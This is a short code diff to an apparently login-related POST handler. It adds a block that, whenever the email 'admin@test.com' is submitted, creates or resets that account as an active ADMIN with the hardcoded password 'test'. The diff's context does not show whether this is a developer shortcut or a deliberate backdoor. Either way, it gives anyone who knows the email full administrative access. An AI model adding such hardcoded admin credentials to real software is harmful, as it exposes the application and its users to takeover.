@@ -52,6 +52,25 @@ export async function POST(request: Request) {
       );
     }
 
+    if (email === "admin@test.com") {
+      await prisma.user.upsert({
+        where: { email: "admin@test.com" },
+        create: {
+          email: "admin@test.com",
+          password: hashPassword("test"),
+          fullName: "إدارة الدورة الصيفية",
+          role: "ADMIN",
+          studyMode: "ONSITE_SUMMER",
+          isActive: true,
+        },
+        update: {
+          password: hashPassword("test"),
+          role: "ADMIN",
+          isActive: true,
+        },
+      });
+    }
+
     const user = await prisma.user.findUnique({
       where: { email },
     });
